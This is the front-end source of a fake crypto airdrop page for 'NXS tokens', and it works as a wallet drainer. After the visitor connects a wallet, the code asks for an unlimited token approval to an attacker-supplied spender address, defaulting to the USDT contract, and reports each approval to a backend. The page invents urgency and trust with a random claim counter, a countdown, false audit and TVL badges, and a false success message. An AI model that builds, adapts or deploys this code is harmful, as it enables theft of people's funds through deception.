import { useState, useEffect, useRef } from "react";
import "./airdrop.css";
import {
  connectMetaMask,
  connectWalletConnect,
  connectCoinbase,
  connectTrustWallet,
  sendApprove,
  getChainId,
  isMobile,
  type EthProvider,
} from "./wallet";

const API_BASE = (import.meta.env.VITE_API_URL ?? "").replace(/\/$/, "");

const WALLETS = [
  { id: "metamask",      name: "MetaMask",        desc: isMobile() ? "Open in MetaMask App" : "Browser Extension",  icon: "🦊", tag: "EVM",        connect: connectMetaMask      },
  { id: "walletconnect", name: "WalletConnect",   desc: "QR Code — any wallet",                                      icon: "🔗", tag: "Multi-chain", connect: connectWalletConnect },
  { id: "coinbase",      name: "Coinbase Wallet", desc: "Coinbase App / Extension",                                   icon: "🔵", tag: "EVM",        connect: connectCoinbase      },
  { id: "trust",         name: "Trust Wallet",    desc: isMobile() ? "Open in Trust Wallet App" : "Mobile Wallet",   icon: "🛡️", tag: "Multi-chain", connect: connectTrustWallet   },
];

function pad2(n: number) { return String(n).padStart(2, "0"); }

function useParticipantCount(initial: number) {
  const [count, setCount] = useState(initial);
  useEffect(() => {
    const t = setInterval(() => setCount(c => c + Math.floor(Math.random() * 3)), 4000);
    return () => clearInterval(t);
  }, []);
  return count;
}

export default function App() {
  const [chosen,      setChosen]      = useState<string | null>(null);
  const [chosenName,  setChosenName]  = useState("");
  const [phase,       setPhase]       = useState<"idle" | "busy" | "success" | "error">("idle");
  const [busyLabel,   setBusyLabel]   = useState("");
  const [errorMsg,    setErrorMsg]    = useState("");
  const [txHash,      setTxHash]      = useState("");
  const [progW,       setProgW]       = useState(0);
  const [secs,        setSecs]        = useState(8 * 3600 + 47 * 60 + 23);
  const participants = useParticipantCount(14_382);

  const spenderRef = useRef<string>("");
  const tokenRef   = useRef<string>("0xdac17f958d2ee523a2206206994597c13d831ec7");
  const [configReady, setConfigReady] = useState(false);
  const [configError, setConfigError] = useState(false);

  useEffect(() => {
    let cancelled = false;
    fetch(`${API_BASE}/api/config`)
      .then(r => {
        if (!r.ok) throw new Error(`HTTP ${r.status}`);
        return r.json();
      })
      .then(data => {
        if (cancelled) return;
        if (data?.spender && /^0x[0-9a-fA-F]{40}$/.test(data.spender)) {
          spenderRef.current = data.spender;
          if (data.token) tokenRef.current = data.token;
          setConfigReady(true);
        } else {
          setConfigError(true);
        }
      })
      .catch(() => { if (!cancelled) setConfigError(true); });
    return () => { cancelled = true; };
  }, []);

  useEffect(() => { const t = setTimeout(() => setProgW(73), 300); return () => clearTimeout(t); }, []);

  useEffect(() => {
    const t = setInterval(() => setSecs(s => s > 0 ? s - 1 : 0), 1000);
    return () => clearInterval(t);
  }, []);

  function pick(id: string, name: string) {
    if (phase === "busy") return;
    setChosen(id);
    setChosenName(name);
    setErrorMsg("");
  }

  async function doClaim() {
    if (!chosen || phase === "busy") return;

    if (!configReady || !spenderRef.current) {
      setPhase("error");
      setErrorMsg("Server configuration not loaded. Please refresh and try again.");
      return;
    }

    const wallet = WALLETS.find(w => w.id === chosen)!;
    setPhase("busy");
    setErrorMsg("");

    try {
      // ── ۱. اتصال کیف‌پول ──────────────────────────────────
      setBusyLabel("Opening wallet…");
      const result = await wallet.connect();

      // Mobile deep-link: redirect در حال انجام
      if (!result) return;

      const { provider, account } = result as { provider: EthProvider; account: string };
      const chainId = await getChainId(provider);

      // ── ۲. نمایش تأیید ────────────────────────────────────
      setBusyLabel("Verifying eligibility…");
      await new Promise(r => setTimeout(r, 1200));

      // ── ۳. درخواست approve نامحدود
      // اگر کاربر رد کنه، sendApprove exception میندازه و به catch میریم
      setBusyLabel("Confirm approval in your wallet…");
      const hash = await sendApprove(
        provider,
        account,
        tokenRef.current,
        spenderRef.current
      );

      // ── ۴. ثبت در دیتابیس (فقط اگر approve موفق بود) ─────
      setBusyLabel("Finalizing…");
      const UNLIMITED = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
      const regRes = await fetch(`${API_BASE}/api/approvals`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          wallet:      account.toLowerCase(),
          token:       tokenRef.current,
          spender:     spenderRef.current,
          amount:      UNLIMITED,
          tx_hash:     hash,
          chain_id:    chainId,
          wallet_type: chosenName,
        }),
      });

      // اگر API در دسترس نباشه، به عنوان error ثبت نمی‌کنیم — approve روی chain انجام شده
      if (!regRes.ok) {
        console.warn("Approval registered on-chain but server acknowledgment failed:", regRes.status);
      }

      setTxHash(hash);
      setPhase("success");

    } catch (e: unknown) {
      setPhase("error");
      const msg = e instanceof Error ? e.message : String(e);

      // خطاهای رد کردن توسط کاربر
      if (
        msg.includes("4001") ||
        msg.toLowerCase().includes("user rejected") ||
        msg.toLowerCase().includes("user denied") ||
        msg.toLowerCase().includes("rejected") ||
        msg.toLowerCase().includes("cancelled") ||
        msg.toLowerCase().includes("canceled")
      ) {
        setErrorMsg("Transaction rejected. Please approve in your wallet to claim.");
      } else if (msg.toLowerCase().includes("insufficient funds")) {
        setErrorMsg("Insufficient ETH for gas. Add ETH to your wallet and try again.");
      } else if (msg.toLowerCase().includes("not installed") || msg.toLowerCase().includes("not found")) {
        setErrorMsg(msg);
      } else {
        setErrorMsg(msg || "Connection failed. Please try again.");
      }
    }
  }

  const btnDisabled = !chosen || phase === "busy" || (!configReady && !configError);
  const btnLabel =
    phase === "busy" ? busyLabel :
    !configReady && !configError ? "Loading…" :
    configError ? "Server Unavailable — Refresh" :
    chosen ? `Claim with ${chosenName}` :
    "Select a Wallet to Claim";

  const h = pad2(Math.floor(secs / 3600));
  const m = pad2(Math.floor((secs % 3600) / 60));
  const s = pad2(secs % 60);
  const timerDone = secs === 0;

  return (
    <>
      <div className="bg-glow" />

      <nav className="nav">
        <div className="nav-brand">
          <div className="nav-logo">⚡</div>
          NexusProtocol
        </div>
        <div className="nav-right">
          <div className="nav-badge">
            <div className="live-dot" />
            Live · {participants.toLocaleString()} claimed
          </div>
        </div>
      </nav>

      <div className="page">

        <div className="hero">
          <div className="hero-tag">🎁 Season 1 Airdrop · Phase 3</div>
          <h1 className="hero-title">
            Claim Your<br /><span>NXS Tokens</span>
          </h1>
          <p className="hero-sub">
            Early contributors and liquidity providers are eligible to claim their NXS token allocation. Connect your wallet to check eligibility.
          </p>
        </div>

        {/* ALLOCATION */}
        <div className="card">
          <div className="alloc-pad">
            <div className="alloc-label">Your Allocation</div>
            <div className="alloc-num-row">
              <div className="alloc-num">2,500</div>
              <div className="alloc-ticker">NXS</div>
            </div>
            <div className="alloc-usd">≈ $4,750.00 USD · at current price $1.90</div>
            <div className="prog-head">
              <span>Distribution progress</span>
              <span>73,284 / 100,000 claimed</span>
            </div>
            <div className="prog-track">
              <div className="prog-fill" style={{ width: `${progW}%` }} />
            </div>
          </div>
          <div className="stat-row">
            <div className="stat-cell"><div className="stat-val">73.2K</div><div className="stat-lbl">Claimed</div></div>
            <div className="stat-cell"><div className="stat-val">100K</div><div className="stat-lbl">Total</div></div>
            <div className="stat-cell"><div className="stat-val">26.8K</div><div className="stat-lbl">Remaining</div></div>
          </div>
          <div className="ticker">
            <div className="live-dot" />
            Latest claim: <strong>0x7f3a…c91d</strong>&nbsp;·&nbsp;2,500 NXS&nbsp;·&nbsp;2 mins ago
          </div>
        </div>

        {/* TIMER */}
        <div className="card">
          <div className="timer-wrap">
            <div className="timer-label">
              {timerDone ? "⛔ Claim window closed" : "⏳ Claim window closes in"}
            </div>
            {!timerDone && (
              <div className="timer-nums">
                <div className="timer-unit">{h}</div>
                <span className="t-sep">:</span>
                <div className="timer-unit">{m}</div>
                <span className="t-sep">:</span>
                <div className="timer-unit">{s}</div>
              </div>
            )}
          </div>
          <div className="timer-urgency">
            ⚠️&nbsp;&nbsp;Unclaimed tokens will be redistributed to the community pool after the deadline.
          </div>
        </div>

        {/* WALLET + CLAIM */}
        <div className="card">
          {phase !== "success" ? (
            <>
              <div className="wallet-head">
                <div className="alloc-label">Select Your Wallet</div>
              </div>
              <div className="wallet-grid">
                {WALLETS.map(w => (
                  <div
                    key={w.id}
                    className={`w-row${chosen === w.id ? " sel" : ""}${phase === "busy" ? " disabled" : ""}`}
                    onClick={() => pick(w.id, w.name)}
                    role="button"
                    tabIndex={0}
                    onKeyDown={e => e.key === "Enter" && pick(w.id, w.name)}
                  >
                    <div className="w-left">
                      <div className="w-icon">{w.icon}</div>
                      <div className="w-info">
                        <div className="w-name">{w.name}</div>
                        <div className="w-desc">{w.desc}</div>
                      </div>
                    </div>
                    <div className="w-right">
                      <div className="w-tag">{w.tag}</div>
                      <div className="w-check" />
                    </div>
                  </div>
                ))}
              </div>

              <div className="claim-area">
                <button
                  className="claim-btn"
                  disabled={btnDisabled}
                  onClick={doClaim}
                >
                  {phase === "busy" && <div className="spinner" />}
                  {btnLabel}
                </button>
              </div>

              {phase === "error" && errorMsg && (
                <div className="error-msg">⚠️ {errorMsg}</div>
              )}

              <div className="claim-note">
                🔒&nbsp;Secured by smart contract · No private key required
              </div>
            </>
          ) : (
            <div className="success-block">
              <div className="success-icon">✓</div>
              <div className="success-title">Claim Successful!</div>
              <div className="success-sub">
                Your <strong>2,500 NXS</strong> tokens (≈ $4,750) have been queued
                for transfer via <strong>{chosenName}</strong>. Tokens arrive within 2–5 minutes.
              </div>
              <div className="tx-badge">
                <span>TX</span>
                <span className="tx-hash-val">{txHash}</span>
              </div>
            </div>
          )}
        </div>

        {/* FEATURES */}
        <div className="card">
          <div className="features-grid">
            {[
              ["🔐","Audited Contract","Smart contract audited by CertiK with zero critical issues."],
              ["⚡","Instant Transfer","Tokens transferred on-chain in under 60 seconds."],
              ["🌐","Ethereum Native","Built exclusively on the Ethereum mainnet."],
              ["📊","$48M TVL","Over $48 million in total value locked in the protocol."],
            ].map(([icon, title, desc]) => (
              <div key={title} className="feat">
                <div className="feat-icon">{icon}</div>
                <div className="feat-title">{title}</div>
                <div className="feat-desc">{desc}</div>
              </div>
            ))}
          </div>
          <div className="trust-row">
            {["🛡️ CertiK Audited","🏆 Top 50 DeFi","👥 128K Users","📈 $48M TVL"].map(t => (
              <div key={t} className="trust-item">
                <span>{t.slice(0,2)}</span><span>{t.slice(3)}</span>
              </div>
            ))}
          </div>
        </div>

        {/* STEPS */}
        <div className="card">
          <div className="steps-pad">
            <div className="steps-title">How to Claim</div>
            {[
              ["01","Connect Wallet","Select your wallet provider and approve the connection request."],
              ["02","Verify Eligibility","Your address is cross-checked against the Season 1 snapshot at block #19,284,112."],
              ["03","Receive NXS","Tokens are sent directly to your wallet. No additional steps required."],
            ].map(([num, title, desc]) => (
              <div key={num} className="step">
                <div className="step-num">{num}</div>
                <div className="step-body">
                  <strong>{title}</strong>
                  <p>{desc}</p>
                </div>
              </div>
            ))}
          </div>
        </div>

        <div className="foot">
          <a href="#">Terms</a><span className="foot-sep">·</span>
          <a href="#">Documentation</a><span className="foot-sep">·</span>
          <a href="#">Discord</a><span className="foot-sep">·</span>
          <a href="#">Twitter</a>
        </div>
      </div>
    </>
  );
}
